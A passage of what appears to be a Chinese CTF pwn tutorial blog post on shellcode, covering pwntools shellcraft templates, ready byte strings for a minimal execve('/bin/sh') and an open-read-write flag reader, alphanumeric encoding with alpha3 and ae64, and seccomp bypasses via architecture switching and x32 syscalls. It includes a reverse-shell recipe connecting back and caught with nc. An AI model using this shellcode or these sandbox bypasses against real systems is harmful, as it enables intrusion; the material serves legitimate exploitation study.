<span class="comment">// 从栈上读取 rsp + 0x8 处的 8 字节数据</span></span></span><br><span class="line"><span class="params">        : [val] <span class="string">&quot;=r&quot;</span> (value)        <span class="comment">// 输出到 C 变量 value</span></span></span><br><span class="line"><span class="params">        :</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;memory&quot;</span>                  <span class="comment">// 通知编译器我们读取了内存</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[rsp + 0x8] = 0x%lx\n&quot;</span>, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="四、pwn-shellcraft-模块生成-shellcode"><a href="#四、pwn-shellcraft-模块生成-shellcode" class="headerlink" title="四、pwn-shellcraft 模块生成 shellcode"></a>四、pwn-shellcraft 模块生成 shellcode</h2><p>pwntools 的 <strong>shellcraft</strong> 是一个跨架构的 <strong>Shellcode 生成器</strong>。它按目标 <strong>操作系统&#x2F;CPU 架构</strong> 提供大量即用型模板（如 <strong>Linux x86&#x2F;x64&#x2F;ARM&#x2F;AArch64</strong> 等），既能直接输出 <strong>汇编文本</strong>，也能配合 <strong>asm()</strong> 输出 <strong>机器码</strong>，用于快速构造 <strong>execve(“&#x2F;bin&#x2F;sh”)<strong>、</strong>文件读写</strong>、<strong>网络通信</strong>、<strong>系统调用</strong>、<strong>栈&#x2F;寄存器操作</strong> 等常见利用原语。使用时通常通过 <strong>context(os &#x3D;…, arch &#x3D;…)</strong> 指定目标环境，或在命令行用 <strong>–context</strong> 指定；还可在命令行用 <strong>shellcraft -l</strong> 浏览可用模板、<strong>shellcraft &lt;arch&gt;.&lt;os&gt;.&lt;template&gt;</strong> 直接生成对应平台的代码</p>
+<h3 id="（一）通用功能与常用模板"><a href="#（一）通用功能与常用模板" class="headerlink" title="（一）通用功能与常用模板"></a>（一）<strong>通用功能与常用模板</strong></h3><ul>
+<li>通用与调试 **sh()**：<ul>
+<li>生成触发 <strong>&#x2F;bin&#x2F;sh</strong> 的 Shellcode（最常见入口）。<ul>
+<li>**cat(path, fd &#x3D; 1)**：打开文件并写到指定 <strong>文件描述符</strong>（默认 <strong>stdout</strong>）。</li>
+<li>**exit(code &#x3D; 0)**：以指定返回值退出。</li>
+<li>**nop()**：生成单字节 <strong>NOP</strong>。</li>
+<li>**breakpoint() &#x2F; trap()**：插入调试断点（常见为 <strong>int3</strong> 或 **raise(SIGTRAP)**）。</li>
+<li>**crash()**：触发崩溃（用于测试&#x2F;占位）。</li>
+<li>**infloop()**：无限循环（占位&#x2F;调试）。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>栈与数据搬运<ul>
+<li>**push(value, …)<strong>、</strong>pushstr(string, …)<strong>、</strong>pushstr_array(reg, array, …)**：向栈压入立即数&#x2F;字符串&#x2F;指针数组（自动处理对齐与终止符）。</li>
+<li>**mov(dst, src)**：在汇编层面把 <strong>src</strong> 移入 <strong>dst</strong>（支持寄存器&#x2F;立即数，部分平台可自动规避 <strong>0x00&#x2F;0x0a</strong>）。</li>
+<li>**setregs(reg_context, …)<strong>、</strong>memcpy(dest, src, n)<strong>、</strong>xor(key, address, count)**：批量设寄存器、内存拷贝、按字节异或。</li>
+</ul>
+</li>
+<li>文件与 I&#x2F;O<ul>
+<li>**open(filename, flags, mode)<strong>、</strong>readn(fd, buf, nbytes)<strong>、</strong>write(fd, buf, nbytes)**：常用 <strong>open&#x2F;read&#x2F;write</strong> 封装（部分平台提供更高层如 <strong>cat&#x2F;cat2</strong>）。</li>
+</ul>
+</li>
+<li>进程与权限<ul>
+<li>**forkexit()**：fork 后父进程退出（让子进程成为孤儿）。</li>
+<li>**kill(pid, sig)<strong>、</strong>killparent()**：发送信号，或循环杀死父进程直至不可杀。</li>
+</ul>
+</li>
+<li>网络（Linux 常见）<ul>
+<li>**socket(network, proto)<strong>、</strong>connect(host, port, network)<strong>、</strong>dupio(sock)<strong>、</strong>dupsh(sock)**：创建套接字、连接、把套接字复制到 <strong>stdin&#x2F;stdout&#x2F;stderr</strong>，或在此基础上 <strong>spawn shell</strong>。</li>
+<li>**echo(string, sock &#x3D; 1)**：向指定 <strong>fd</strong> 写字符串。</li>
+</ul>
+</li>
+<li>其它常用<ul>
+<li>**sleep(seconds)**：基于 <strong>nanosleep</strong> 的休眠。</li>
+<li>**stage(fd &#x3D; 0, length &#x3D; None)**：从 <strong>fd</strong> 接收数据并迁移&#x2F;重定位 Shellcode 到新缓冲区（常用于第二阶段加载）。</li>
+<li><strong>loader(address)</strong> &#x2F; **loader_append(data &#x3D; None)**：在指定地址加载静态 <strong>ELF</strong> 并跳转（或加载附加的 <strong>ELF</strong> 数据）</li>
+</ul>
+</li>
+</ul>
+<h3 id="（二）典型用法示例"><a href="#（二）典型用法示例" class="headerlink" title="（二）典型用法示例"></a>（二）<strong>典型用法示例</strong></h3><ul>
+<li>生成并获取机器码<ul>
+<li>交互式获取汇编：<ul>
+<li>print(shellcraft.sh())</li>
+</ul>
+</li>
+<li>获取机器码：<ul>
+<li>print(enhex(asm(shellcraft.sh())))</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>指定架构&#x2F;系统<ul>
+<li>命令行：shellcraft aarch64.linux.sh</li>
+<li>脚本：context(os &#x3D;’linux’, arch &#x3D;’aarch64’); asm(shellcraft.sh())</li>
+</ul>
+</li>
+<li>文件读取并输出<ul>
+<li>asm_cat &#x3D; shellcraft.cat(‘&#x2F;etc&#x2F;passwd’) + shellcraft.exit(0)</li>
+<li>print(enhex(asm(asm_cat)))</li>
+</ul>
+</li>
+<li>网络连接与反弹 Shell<ul>
+<li>asm_conn &#x3D; shellcraft.connect(‘127.0.0.1’, 1337) + shellcraft.dupsh(‘x12’)</li>
+<li>发送 asm(asm_conn) 到目标后，nc -lvnp 1337 即可获得交互式 Shell</li>
+</ul>
+</li>
+</ul>
+<h3 id="（三）帮助文档"><a href="#（三）帮助文档" class="headerlink" title="（三）帮助文档"></a>（三）帮助文档</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">shellcraft -h</span><br><span class="line">usage: pwn shellcraft [-h] [-?] [-o file] [-f format] [-d] [-b] [-a] [-v AVOID] [-n] [-z] [-r] [--color] [--no-color] [--syscalls] [--address ADDRESS] [-l] [-s]</span><br><span class="line">                      [shellcode] [arg [arg ...]]</span><br><span class="line"></span><br><span class="line">Microwave shellcode -- Easy, fast and delicious</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  shellcode             The shellcode you want</span><br><span class="line">  arg                   Argument to the chosen shellcode</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -?, --show            Show shellcode documentation</span><br><span class="line">  -o file, --out file   Output file (default: stdout)</span><br><span class="line">  -f format, --format format</span><br><span class="line">                        Output format (default: hex), choose from &#123;e&#125;lf, &#123;r&#125;aw, &#123;s&#125;tring, &#123;c&#125;-style array, &#123;h&#125;ex string, hex&#123;i&#125;i, &#123;a&#125;ssembly code, &#123;p&#125;reprocssed code,</span><br><span class="line">                        escape&#123;d&#125; hex string</span><br><span class="line">  -d, --debug           Debug the shellcode with GDB</span><br><span class="line">  -b, --before          Insert a debug <span class="built_in">trap</span> before the code</span><br><span class="line">  -a, --after           Insert a debug <span class="built_in">trap</span> after the code</span><br><span class="line">  -v AVOID, --avoid AVOID</span><br><span class="line">                        Encode the shellcode to avoid the listed bytes</span><br><span class="line">  -n, --newline         Encode the shellcode to avoid newlines</span><br><span class="line">  -z, --zero            Encode the shellcode to avoid NULL bytes</span><br><span class="line">  -r, --run             Run output</span><br><span class="line">  --color               Color output</span><br><span class="line">  --no-color            Disable color output</span><br><span class="line">  --syscalls            List syscalls</span><br><span class="line">  --address ADDRESS     Load address</span><br><span class="line">  -l, --list            List available shellcodes, optionally provide a filter</span><br><span class="line">  -s, --shared          Generated ELF is a shared library</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="五、最短shellcode"><a href="#五、最短shellcode" class="headerlink" title="五、最短shellcode"></a>五、最短shellcode</h2><h3 id="（一）getshell"><a href="#（一）getshell" class="headerlink" title="（一）getshell"></a>（一）getshell</h3><p>长度为22字节<br>主要是通过cdq将rdx高位为0，减小了长度，另一种方法是通过mul r&#x2F;m64指令，实现清空rax和rdx</p>
+<ul>
+<li>eax 高二位必须为0，一般是满足的</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor 	rsi, rsi</span><br><span class="line">push	rsi	</span><br><span class="line">mov 	rdi, 0x68732f2f6e69622f</span><br><span class="line">push	rdi</span><br><span class="line">push	rsp		</span><br><span class="line">pop	    rdi			</span><br><span class="line">mov 	al,	59	</span><br><span class="line">cdq				</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">48 31 f6             xor rsi, rsi	</span><br><span class="line">56	                 push rsi</span><br><span class="line">58 bf 2f 62 69 6e 2f mov rdi,	0x68732f2f6e69622f;</span><br><span class="line">2f 73 68</span><br><span class="line">57                   push rdi</span><br><span class="line">54                   push rsp		</span><br><span class="line">5f                   pop rdi     ;stack pointer to /bin//sh</span><br><span class="line">b0 3b                mov al, 59	 ;sys_execve 66 b8 3b 00 mov ax,59</span><br><span class="line">99                   cdq 	   	 ;sign extend of eax</span><br><span class="line">0f 05                syscall</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// int</span><br><span class="line">0x622fbf4856f63148</span><br><span class="line">0x545768732f2f6e69</span><br><span class="line">0x050f993bb05f</span><br><span class="line"></span><br><span class="line">// bytes</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="（二）ORW"><a href="#（二）ORW" class="headerlink" title="（二）ORW"></a>（二）ORW</h3><p>长度为0x28字节<br>主要是通过异或实现了取代了mov减少长度</p>
+<ul>
+<li>rsp指向的地址必须是可用的</li>
+<li>存在NULL字符</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// rdx为写入数量</span><br><span class="line">mov rdx, 0x200</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor esi,esi  #如果本来rsi=0，可以删掉这句</span><br><span class="line">mov eax,2</span><br><span class="line">syscall</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br><span class="line">xor edi,2  </span><br><span class="line">mov eax,edi</span><br><span class="line">syscall  </span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x6800000200c2c748</span><br><span class="line">0x31e7894867616c66</span><br><span class="line">0x050f00000002b8f6</span><br><span class="line">0x0fc031e68948c789</span><br><span class="line">0x050ff88902f78305</span><br><span class="line"></span><br><span class="line">\x48\xc7\xc2\x00\x02\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x83\xf7\x02\x89\xf8\x0f\x05</span><br></pre></td></tr></table></figure></div>
+
+<p>可指定地点</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &quot;&quot;&quot;</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov dh, 0x2</span><br><span class="line">mov rdi,&#123;&#125;</span><br><span class="line">xor esi,esi  </span><br><span class="line">mov eax,2</span><br><span class="line">syscall</span><br><span class="line">mov rsi,rdi</span><br><span class="line">mov edi,eax</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br><span class="line">xor edi,2</span><br><span class="line">mov eax,edi</span><br><span class="line">syscall</span><br><span class="line">&quot;&quot;&quot;.format(hex(target_addr + 0xb0))</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="六、字符限制"><a href="#六、字符限制" class="headerlink" title="六、字符限制"></a>六、字符限制</h2><table>
+<thead>
+<tr>
+<th align="center"></th>
+<th>ae64</th>
+<th>alpha3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Encode x32 alphanumeric shellcode</td>
+<td>❌</td>
+<td>✔</td>
+</tr>
+<tr>
+<td align="center">Encode x64 alphanumeric shellcode</td>
+<td>✔</td>
+<td>❌</td>
+</tr>
+<tr>
+<td align="center">Original shellcode can contain zero bytes</td>
+<td>✔</td>
+<td>❌</td>
+</tr>
+<tr>
+<td align="center">Base address register can contain offset</td>
+<td>✔</td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="（一）Alpha3"><a href="#（一）Alpha3" class="headerlink" title="（一）Alpha3"></a>（一）Alpha3</h3><p>限制只能使用字母或者数字<br>alpha3使用:<br>alpha3需要python2环境，所以先安装python2。可以选择架构、编码、限制的字符</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">sc = b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x31\xc0\xb0\x3b\x99\x0f\x05&quot;</span><br><span class="line">with open(&quot;./sc.bin&quot;,&#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(sc)</span><br><span class="line"></span><br><span class="line"># python2 ALPHA3.py x64 ascii mixedcase rdx --input=&quot;sc.bin&quot; &gt; out.bin </span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="（二）ae64"><a href="#（二）ae64" class="headerlink" title="（二）ae64"></a>（二）ae64</h3><p>AE64可以直接在python中导入，使用相对较为方便且限制较少</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from ae64 import AE64</span><br><span class="line">from pwn import *</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line"># get bytes format shellcode</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"># get alphanumeric shellcode</span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line">print(enc_shellcode.decode(&#x27;latin-1&#x27;))</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="（三）手动绕过"><a href="#（三）手动绕过" class="headerlink" title="（三）手动绕过"></a>（三）手动绕过</h3><p><a class="link" target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode - NetSec<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<ul>
+<li>x86_64 alphanumeric execve(‘&#x2F;bin&#x2F;sh’,null,null) - 111 bytes:</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="（四）限制字母和数字"><a href="#（四）限制字母和数字" class="headerlink" title="（四）限制字母和数字"></a>（四）限制字母和数字</h3><p>很多时候，会限制为纯小写字母或者部分字母或者部分数字。这个时候，需要根据限制条件，把能用的<code>shellcode</code>组合梳理出来，然后结合<code>shellcode</code>的执行地址，利用<code>xor/add</code>等指令，构造出其他所需要的指令。</p>
+<p>举个例子，假如<code>shellcode</code>执行地址<code>0x333100</code>，只能用<code>0x30-0x40</code>编写<code>shellcode</code>，如果需要<code>\x0f\x05</code>，可以用异或：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xor eax, 0x33333130; 3530313333</span><br><span class="line">xor eax, 0x3333343f; 353f343333</span><br><span class="line">;此时，eax就成为0x050f了</span><br></pre></td></tr></table></figure></div>
+
+<p>可以用<code>pwntools</code>的<code>disasm</code>爆破所有可能的<code>shellcode</code>组合：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;0123456789\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> itertools.product(s, repeat=x+<span class="number">1</span>):</span><br><span class="line">        res = disasm(<span class="string">&quot;&quot;</span>.join(y).encode())</span><br><span class="line">        need_p = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span>  (<span class="string">&quot;.byte&quot;</span>, <span class="string">&quot;rex&quot;</span>, <span class="string">&quot;ds&quot;</span>, <span class="string">&quot;bad&quot;</span>, <span class="string">&quot;ss&quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> kk <span class="keyword">in</span> res:</span><br><span class="line">                need_p = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> need_p:</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h2><h3 id="（一）at-v-2替换"><a href="#（一）at-v-2替换" class="headerlink" title="（一）at&#x2F;v&#x2F;2替换"></a>（一）at&#x2F;v&#x2F;2替换</h3><p>这里分别指的是几个系统调用的后缀和前缀，比如：</p>
+<ul>
+<li>使用<code>execveat</code>代替<code>execve</code>，拿到<code>shell</code>后，使用<code>shell</code>内置命令读取<code>flag</code>: <code>echo *; read FLAG &lt; /flag;echo $FLAG</code>，否则使用子<code>shell</code>执行命令还是会被沙箱杀死。同样的，使用<code>openat</code>代替<code>open</code>。</li>
+<li>使用<code>readv/writev</code>代替<code>read/write</code></li>
+<li>使用<code>mmap2</code>代替<code>mmap</code></li>
+<li>还有一些特殊的系统调用，使用<code>sendfile</code>，代替<code>read/write</code>。这类的系统调用需要平时多关注、收集和整理。</li>
+</ul>
+<h3 id="（二）使用orw读取flag"><a href="#（二）使用orw读取flag" class="headerlink" title="（二）使用orw读取flag"></a>（二）使用orw读取flag</h3><p>一般来说，会禁止<code>system/execve/fork</code>等，这个时候使用<code>open+read+write</code>输出<code>flag</code>即可。</p>
+<p>或者使用<code>open+sendfile</code>，指令会更短。</p>
+<h3 id="（三）切换指令模式"><a href="#（三）切换指令模式" class="headerlink" title="（三）切换指令模式"></a>（三）切换指令模式</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x06 0x00 0x40000000  <span class="keyword">if</span> (A &gt;= 0x40000000) goto 0010</span><br><span class="line"> 0004: 0x15 0x05 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0010</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000142  <span class="keyword">if</span> (A == execveat) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000039  <span class="keyword">if</span> (A == fork) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000038  <span class="keyword">if</span> (A == <span class="built_in">clone</span>) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000000f  <span class="keyword">if</span> (A == rt_sigreturn) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure></div>
+
+<p>这个沙箱规则判断了当前触发系统调用的时候，<code>arch</code>是否为<code>x64</code>，如果不是<code>64</code>就会<code>kill</code>；然后，判断了<code>sys-number</code>是否大于等于<code>0x40000000</code>，如果大于，程序也会被<code>kill</code>；然后设置了黑名单，分别是：<code>execve/execveat/fork/clone/rt_sigreturn</code>。处于黑名单的系统调用会被<code>kill</code>掉，其他系统调用则会放行。</p>
+<p>如果没有<code>0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010</code>这一句的检查，那么可以使用<code>retf(return far)</code>指令实现架构切换，或者在<code>x64</code>环境下直接调用<code>int 0x80</code>陷入到内核态。</p>
+<p><code>retf</code>相当于<code>pop ip; pop cs</code>，<code>cs</code>是段寄存器，寄存器为<code>0x23</code>时表示<code>32</code>位运行模式，<code>0x33</code>表示<code>64</code>位运行模式。</p>
+<p>从<code>64</code>位切换到<code>32</code>位的模板如下：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor esp, esp</span><br><span class="line">mov rsp, 0x400100</span><br><span class="line">mov eax, 0x23 ; cs</span><br><span class="line">mov [rsp+4], eax</span><br><span class="line">mov eax, 0x400800 ; ip</span><br><span class="line">mov [rsp], eax</span><br><span class="line">retf</span><br></pre></td></tr></table></figure></div>
+
+<p>如果没有限制：<code>0003: 0x35 0x06 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0010</code>的话，那么可以使用<code>0x40000000 + X</code>来执行系统调用。</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __X32_SYSCALL_BIT	0x40000000UL</span></span><br></pre></td></tr></table></figure></div>
+
+<p>关于<code>x32 ABI</code>可查看<a class="link" target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/X32_ABI">x32 ABI - Wikipedia<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
+<p>比如要执行<code>read</code></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">add eax, 0x40000000</span><br><span class="line">xor edi, edi</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov edx, 0x300</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></div>
+
+<p>需要注意的是，从<code>5.16</code>开始，<code>linux</code>内核不支持<code>x32 abi</code>了：<a class="link" target="_blank" rel="noopener" href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1994516">Bug #1994516 “Kernels after 5.16 cannot execute x32-ABI binaries…” : Bugs : linux package : Ubuntu (launchpad.net)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="七、Tricks"><a href="#七、Tricks" class="headerlink" title="七、Tricks"></a>七、Tricks</h2><ul>
+<li><p>当寄存器全 0 时，只需要执行一次 <code>syscall</code>，就会把返回地址 <code>rip</code> 赋值给 <code>rcx</code> 寄存器，<code>rcx</code> 寄存器就会有 <code>rwx</code> 地址，然后再 <code>mov rsi,rcx;mov dl,0xff;syscall</code>，就会 <code>reread</code></p>
+<ul>
+<li><pre><code class="nasm">syscall   //0f 05
+mov rsi, rcx  //48 89 ce
+mov dl, 0xff //b2 ff
+syscall  //0f 05
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>使用 mov 时，对同一个寄存器的不同部分操作，指令字长不一样。例如，mov dl, 0xff 只有 9 个字节，而 mov rdx, 0xff 有 14 个字节，mov edx, 0xff 有 12 个字节</p>
+<ul>
+<li><table>
+<thead>
+<tr>
+<th>64 位</th>
+<th>32 位</th>
+<th>16 位</th>
+<th>高 8 位(H)</th>
+<th>低 8 位(L)</th>
+<th>主要用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>RAX</strong>​</td>
+<td><strong>EAX</strong>​</td>
+<td><strong>AX</strong>​</td>
+<td><strong>AH</strong>​</td>
+<td><strong>AL</strong>​</td>
+<td>累加器, 返回值, 系统调用号</td>
+</tr>
+<tr>
+<td><strong>RBX</strong>​</td>
+<td><strong>EBX</strong>​</td>
+<td><strong>BX</strong>​</td>
+<td><strong>BH</strong>​</td>
+<td><strong>BL</strong>​</td>
+<td>基址指针, 保留寄存器</td>
+</tr>
+<tr>
+<td><strong>RCX</strong>​</td>
+<td><strong>ECX</strong>​</td>
+<td><strong>CX</strong>​</td>
+<td><strong>CH</strong>​</td>
+<td><strong>CL</strong>​</td>
+<td>计数器, 第 4 个参数</td>
+</tr>
+<tr>
